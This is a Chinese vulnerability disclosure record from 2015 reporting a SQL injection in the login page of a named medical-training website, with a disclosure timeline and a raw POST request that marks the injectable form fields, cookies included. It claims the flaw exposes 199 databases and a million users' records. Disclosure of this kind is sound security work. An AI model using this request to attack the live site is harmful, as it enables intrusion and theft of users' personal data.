wybug_title: 华医网某站SQL注射漏洞（199库/1.6万表/影响百万用户信息/可导致整站数据沦陷）
wybug_detail:
漏洞详情 披露状态：   									2015-09-20：	细节已通知厂商并且等待厂商处理中									2015-09-21：	厂商已经确认，细节仅向厂商公开									2015-10-01：	细节向核心白帽子及相关领域专家公开									2015-10-11：	细节向普通白帽子公开									2015-10-21：	细节向实习白帽子公开									2015-11-05：	细节向公众公开  简要描述： 网站用户量大， 危害不用我说 详细说明：  POST 注入
POST /secure/login.aspx HTTP/1.1Host: wspx.91huayi.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://wspx.91huayi.com/secure/login.aspxCookie: Hm_lvt_b8b19370771d6914b2aac73158a962b8=1442572652,1442576391,1442576639,1442576643; Hm_lpvt_b8b19370771d6914b2aac73158a962b8=1442576643; Hm_lvt_ff0968fe442c4e89bf0c5108743a5f31=1442572652,1442576643; Hm_lpvt_ff0968fe442c4e89bf0c5108743a5f31=1442576643; __BAIDU_STATE_END__=yes; lzstat_uv=35798770783457191819|3596064; lzstat_ss=1195955735_0_1442601465_3596064; looyu_id=44824ed193e7b634c36641aba789a878db_30173%3A2; ASP.NET_SessionId=bpvs3dhgdui3ruedllhhhk1uConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 318__VIEWSTATE=%2FwEPDwUJLTEzNDQ1MzY2ZGRgUGJP5%2FXmGApmSkOHzDyQRBzmDcTmD4V3QkS3Z4eNhg%3D%3D&__EVENTVALIDATION=%2FwEWBwKn2tDcAwKz8d68BQLVqbaRCwKzi6TGAQKz8aa8BQLVqc7yCwK%2B6b74CSxPELbmMKV%2Focf9S%2B08O7JNK5iIEo9L1%2FM%2BfcJRTlnW&TxtUserID=admin&TxtPassword=&TxtUserID2=admin&TxtPassword2=123456&btnlogin2=%E7%99%BB%E5%BD%95
